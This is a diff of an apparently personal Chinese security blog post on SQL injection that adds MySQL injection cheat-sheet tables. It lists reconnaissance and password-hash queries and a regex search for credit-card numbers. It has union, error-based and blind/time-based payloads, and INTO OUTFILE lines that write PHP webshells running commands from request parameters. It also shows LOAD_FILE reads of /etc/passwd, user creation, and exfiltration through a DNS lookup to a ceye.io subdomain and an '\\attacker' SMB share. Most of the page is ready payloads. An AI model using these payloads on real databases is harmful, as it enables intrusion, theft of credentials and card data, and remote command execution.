@@ -6,8 +6,8 @@
 <meta property="og:description" content="漏洞的类型SQL注入的具体判断流程：1.注入点测试： 测试交互方式，判断浏览器提交数据和web浏览器的交互方式。 2.判断字符的类型：整数型还是字符型 3.构造闭合：（字符型需要，整型不需要） 4.查询字段数：构造SQL语句并判断数据库表的行数 5.判断回显位：构造SQL语句，找到数据库回显的位置 6.查询数据库的基本信息：数据库名字、版本 7.爆数据库的敏感信息：数据库表名、字段名（列名）、字符">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://xdzjldy.github.io/img/5.jpg">
-<meta property="article:published_time" content="2025-01-29T09:34:11.000Z">
-<meta property="article:modified_time" content="2025-01-29T09:35:44.100Z">
+<meta property="article:published_time" content="2025-01-29T13:10:11.000Z">
+<meta property="article:modified_time" content="2025-01-29T13:10:11.167Z">
 <meta property="article:author" content="xdzjldy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://xdzjldy.github.io/img/5.jpg"><link rel="shortcut icon" href="D:/3.jpg"><link rel="canonical" href="https://xdzjldy.github.io/2025/01/29/SQL%E7%BB%95%E8%BF%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
@@ -55,7 +55,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2025-01-29 17:35:44'
+  postUpdate: '2025-01-29 21:10:11'
 }</script><script>(win=>{
       win.saveToLocal = {
         set: (key, value, ttl) => {
@@ -152,7 +152,7 @@
         }
       }
       detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/5.jpg" onerror="onerror=null;src='/img/5.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="xdzjldy"><span class="site-name">xdzjldy</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL绕过</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-01-29T09:34:11.000Z" title="Created 2025-01-29 17:34:11">2025-01-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-01-29T09:35:44.100Z" title="Updated 2025-01-29 17:35:44">2025-01-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL绕过"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="漏洞的类型"><a href="#漏洞的类型" class="headerlink" title="漏洞的类型"></a>漏洞的类型</h1><h2 id="SQL注入的具体判断流程："><a href="#SQL注入的具体判断流程：" class="headerlink" title="SQL注入的具体判断流程："></a>SQL注入的具体判断流程：</h2><p>1.注入点测试：</p>
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/5.jpg" onerror="onerror=null;src='/img/5.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="xdzjldy"><span class="site-name">xdzjldy</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL绕过</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-01-29T13:10:11.000Z" title="Created 2025-01-29 21:10:11">2025-01-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-01-29T13:10:11.167Z" title="Updated 2025-01-29 21:10:11">2025-01-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL绕过"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="漏洞的类型"><a href="#漏洞的类型" class="headerlink" title="漏洞的类型"></a>漏洞的类型</h1><h2 id="SQL注入的具体判断流程："><a href="#SQL注入的具体判断流程：" class="headerlink" title="SQL注入的具体判断流程："></a>SQL注入的具体判断流程：</h2><p>1.注入点测试：</p>
 <p>测试交互方式，判断浏览器<strong>提交数据</strong>和web浏览器的<strong>交互方式</strong>。</p>
 <p>2.判断字符的类型：<strong>整数型还是字符型</strong></p>
 <p>3.构造闭合：（字符型需要，整型不需要）</p>
@@ -160,7 +160,207 @@
 <p>5.判断回显位：构造SQL语句，找到数据库回显的位置</p>
 <p>6.查询数据库的基本信息：数据库名字、版本</p>
 <p>7.爆数据库的敏感信息：数据库表名、字段名（列名）、字符中的数据</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Version</td>
+<td align="left"><code>SELECT @@version;</code></td>
+</tr>
+<tr>
+<td align="left">User</td>
+<td align="left"><code>SELECT user() SELECT system_user();</code></td>
+</tr>
+<tr>
+<td align="left">Users</td>
+<td align="left"><code>SELECT user FROM mysql.user * SELECT Super_priv FROM mysql.user WHERE user= &#39;root&#39; LIMIT 1,1;</code></td>
+</tr>
+<tr>
+<td align="left">Tables</td>
+<td align="left"><code>SELECT table_schema, table_name FROM information_schema.tables;</code></td>
+</tr>
+<tr>
+<td align="left">Columns</td>
+<td align="left"><code>SELECT table_name, column_name FROM information_schema.columns;</code></td>
+</tr>
+<tr>
+<td align="left">Databases</td>
+<td align="left"><code>SELECT schema_name FROM information_schema.schemata ;</code></td>
+</tr>
+<tr>
+<td align="left">Current Database Name</td>
+<td align="left"><code>SELECT database();</code></td>
+</tr>
+<tr>
+<td align="left">Query another Database</td>
+<td align="left"><code>USE [database_name]; SELECT database(); SELECT [column] FROM [database_name].[table_name];</code></td>
+</tr>
+<tr>
+<td align="left">Number of Columns</td>
+<td align="left"><code>SELECT count(*) FROM information_schema.columns WHERE table_name = &#39;[table_name]&#39;;</code></td>
+</tr>
+<tr>
+<td align="left">DBA Accounts</td>
+<td align="left"><code>SELECT host, user FROM mysql.user WHERE Super_priv = &#39;Y&#39;;</code></td>
+</tr>
+<tr>
+<td align="left">Password Hashes</td>
+<td align="left"><code>SELECT host, user, password FROM mysql.user;</code></td>
+</tr>
+<tr>
+<td align="left">Schema</td>
+<td align="left"><code>SELECT schema();</code></td>
+</tr>
+<tr>
+<td align="left">Path to Data</td>
+<td align="left"><code>SELECT @@datadir;</code></td>
+</tr>
+<tr>
+<td align="left">Read Files</td>
+<td align="left"><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;);</code></td>
+</tr>
+</tbody></table>
+<h3 id="数据定位查询"><a href="#数据定位查询" class="headerlink" title="数据定位查询"></a>数据定位查询</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Database sizes</td>
+<td align="left"><code>SELECT table_schema “Database Name&quot;,sum( data_length + index_length ) / 1024 / 1024 “Database Size in MB&quot;,sum( data_free )/ 1024 / 1024 “Free Space in MB&quot; FROM information_schema.TABLES GROUP BY table_schema ;</code></td>
+</tr>
+<tr>
+<td align="left">Database name keyword</td>
+<td align="left"><code>SELECT table_schema “Database Name&quot; FROM information_schema.TABLES WHERE table_schema LIKE “%passwords%&quot; GROUP BY table_schema ;</code></td>
+</tr>
+<tr>
+<td align="left">Table name keyword</td>
+<td align="left"><code>SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT LIKE “information_schema&quot; AND table_name LIKE &quot;%admin%&quot;;</code></td>
+</tr>
+<tr>
+<td align="left">Column name keyword</td>
+<td align="left"><code>SELECT column_name, table_name FROM information_schema.columns WHERE column_name LIKE ”%password%“;</code></td>
+</tr>
+<tr>
+<td align="left">Column data regex</td>
+<td align="left"><code>SELECT * from credit_cards WHERE cc_number REGEXP &#39;^4[0-9]&#123;15&#125;$&#39;;</code></td>
+</tr>
+</tbody></table>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Command Execution (PHP)</td>
+<td align="left"><code>SELECT &quot;&lt;? echo passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO OUTFILE &#39;/var/www/shell.php&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Command Execution with MySQL CLI Access</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</a></td>
+</tr>
+</tbody></table>
+<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Dump to file</td>
+<td align="left"><code>SELECT * FROM mytable INTO dumpfile &#39;/tmp/somefile&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Dump PHP Shell</td>
+<td align="left"><code>SELECT &#39;system($_GET[\&#39;c\&#39;]); ?&gt;&#39; INTO OUTFILE &#39;/var/www/shell.php&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Read File</td>
+<td align="left"><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">Read File Obfuscated</td>
+<td align="left"><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69) reads c:\boot.ini</code></td>
+</tr>
+<tr>
+<td align="left">File Privileges</td>
+<td align="left"><code>SELECT file_priv FROM mysql.user WHERE user = &#39;netspi&#39; SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = &#39;file&#39; AND grantee like &#39;%netspi%&#39;</code></td>
+</tr>
+</tbody></table>
+<h3 id="横向运动"><a href="#横向运动" class="headerlink" title="横向运动"></a>横向运动</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Create Users</td>
+<td align="left"><code>CREATE USER &#39;netspi&#39;@&#39;%&#39; IDENTIFIED BY &#39;password&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Drop User</td>
+<td align="left"><code>DROP USER netspi</code></td>
+</tr>
+</tbody></table>
+<h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">DNS Request</td>
+<td align="left"><code>SELECT LOAD_FILE(concat(&#39;\\\\&#39;,(QUERY_WITH_ONLY_ONE_ROW),&#39;sql.rqe94e.ceye.io\&#39;))</code></td>
+</tr>
+<tr>
+<td align="left">SMB Share</td>
+<td align="left"><code>SELECT * FROM USERS INTO OUTFILE &#39;\\attacker\SMBshare\output.txt&#39;</code></td>
+</tr>
+<tr>
+<td align="left">HTTP Server</td>
+<td align="left"><code>SELECT * FROM USERS INTO OUTFILE &#39;/var/www/html/output.txt&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Numeric Concatenation</td>
+<td align="left"><code>SELECT length(user()) SELECT ASCII(substr(user(),1))</code></td>
+</tr>
+</tbody></table>
 <h2 id="普通查询注入"><a href="#普通查询注入" class="headerlink" title="普通查询注入"></a>普通查询注入</h2><h3 id="判断漏洞是否存在"><a href="#判断漏洞是否存在" class="headerlink" title="判断漏洞是否存在"></a>判断漏洞是否存在</h3><p><strong>union注入（整型和字符型）</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Union</td>
+<td align="left"><code>SELECT &quot;mysql&quot; UNION SELECT @@version</code></td>
+</tr>
+<tr>
+<td align="left">Union subquery</td>
+<td align="left"><code>SELECT &quot;mysql&quot; UNION (select @@version)</code></td>
+</tr>
+<tr>
+<td align="left">Union null</td>
+<td align="left"><code>SELECT &quot;mysql&quot;,&quot;test&quot; UNION SELECT @@version,null</code></td>
+</tr>
+<tr>
+<td align="left">Stacked Queries</td>
+<td align="left"><code>SELECT &quot;mysql&quot;; INSERT INTO &#39;docs&#39; (&#39;content&#39;) VALUES ((SELECT @@version))</code></td>
+</tr>
+</tbody></table>
 <h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>例如后端SQL语句：</p>
 <p><code>select * from article where artid = 1 and xxxxx;</code></p>
 <p>可以在参数值后面输入单引号，此时数据库无法执行就会报错，说明存在SQL注入</p>
@@ -183,6 +383,34 @@
 <h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>
 <h4 id="updatexml：updatexml-xml-doument-XPath-string-new-value"><a href="#updatexml：updatexml-xml-doument-XPath-string-new-value" class="headerlink" title="updatexml：updatexml(xml_doument,XPath_string,new_value)"></a>updatexml：updatexml(xml_doument,XPath_string,new_value)</h4><p>id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>id&#x3D;1 and exp(~(select * from(select user())a));</p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">XML Parse Error</td>
+<td align="left"><code>SELECT extractvalue(rand(),concat(0x3a,(select version())))</code></td>
+</tr>
+<tr>
+<td align="left">Double Query</td>
+<td align="left"><code>SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)2))x FROM information_schema.TABLES GROUP BY x)a)</code></td>
+</tr>
+<tr>
+<td align="left">Get Current Database</td>
+<td align="left"><code>SELECT a()</code></td>
+</tr>
+<tr>
+<td align="left">ExtractValue (最长32位)</td>
+<td align="left"><code>select name,password from typecho.typecho_users where name = &quot;admin&quot; and extractvalue(1, concat(0x7e, (select @@version),0x7e));</code></td>
+</tr>
+<tr>
+<td align="left">UpdateXml (最长32位)</td>
+<td align="left"><code>select name,password from typecho.typecho_users where name = &quot;admin&quot; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></td>
+</tr>
+</tbody></table>
 <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h4 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h4><p>盲注常用的函数</p>
 <p>length() 	# 返回字符串的长度<br>substr() 	# 截取字符串 （语法:SUBSTR(str,pos,len)）<br>ascii() 	# 返回字符的ascii码   [将字符变为数字wei]<br>sleep() 	# 将程序挂起一段时间n为n秒<br>if(expr1,expr2,expr3) # 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
 <p><strong>注入步骤</strong></p>
@@ -199,6 +427,63 @@
 <p>“ and sleep(5)–</p>
 <p>2.猜解当前数据库名称长度</p>
 <p>“ and if((length(database()))&#x3D;12,sleep(5),1)–</p>
+<h4 id="Partial-Blind"><a href="#Partial-Blind" class="headerlink" title="Partial-Blind"></a>Partial-Blind</h4><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Version is 5.x.x</td>
+<td align="left"><code>SELECT substring(version(),1,1)=5</code></td>
+</tr>
+<tr>
+<td align="left">Subselect enabled</td>
+<td align="left"><code>SELECT 1 AND (select 1)=1</code></td>
+</tr>
+<tr>
+<td align="left">Table log_table exists</td>
+<td align="left"><code>SELECT 1 AND (select 1 from log_table limit 0,1)=1</code></td>
+</tr>
+<tr>
+<td align="left">Column message exists in table log_table</td>
+<td align="left"><code>SELECT message FROM log_table LIMIT 0,1</code></td>
+</tr>
+<tr>
+<td align="left">First letter of first message is t</td>
+<td align="left"><code>SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114</code></td>
+</tr>
+</tbody></table>
+<h4 id="Full-Blind"><a href="#Full-Blind" class="headerlink" title="Full-Blind"></a>Full-Blind</h4><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">User is root</td>
+<td align="left"><code>SELECT IF(user() LIKE &#39;root@%&#39;, SLEEP(5), null)</code></td>
+</tr>
+<tr>
+<td align="left">User is root (Benchmark method)</td>
+<td align="left"><code>SELECT IF(user() LIKE &#39;root@%&#39;, BENCHMARK(5000000, ENCODE(&#39;Slow Down&#39;,&#39;by 5 seconds&#39;)), null)</code></td>
+</tr>
+<tr>
+<td align="left">Version is 5.x.x</td>
+<td align="left"><code>SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)</code></td>
+</tr>
+</tbody></table>
 <h3 id="MySQL写webshell"><a href="#MySQL写webshell" class="headerlink" title="MySQL写webshell"></a>MySQL写webshell</h3><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>使用<code>into outfile()</code>将一句话写入网站目录</p>
 <p><code>select &#39;&lt;?php @eval($_POST[CMD]); ?&gt;&#39; into outfile &#39;\/var\/www\/html\/shell.php&#39;;</code></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://xdzjldy.github.io">xdzjldy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://xdzjldy.github.io/2025/01/29/SQL%E7%BB%95%E8%BF%87/">https://xdzjldy.github.io/2025/01/29/SQL%E7%BB%95%E8%BF%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/01/29/SQL-labs/" title="SQL-labs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">SQL-labs</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/5.jpg'" alt="avatar"/></div><div class="author-info__name">xdzjldy</div><div class="author-info__description">弃燕雀之小志，慕鸿鹄以高翔</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.</span> <span class="toc-text">漏洞的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B7%E4%BD%93%E5%88%A4%E6%96%AD%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入的具体判断流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">普通查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">判断漏洞是否存在</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">字符型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">1.2.2.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E5%90%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">爆库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.2.4.</span> <span class="toc-text">爆表名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#floor"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">floor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml%EF%BC%9Aupdatexml-xml-doument-XPath-string-new-value"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">updatexml：updatexml(xml_doument,XPath_string,new_value)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.3.0.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Boolean%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Boolean盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E5%86%99webshell"><span class="toc-number">1.4.1.</span> <span class="toc-text">MySQL写webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 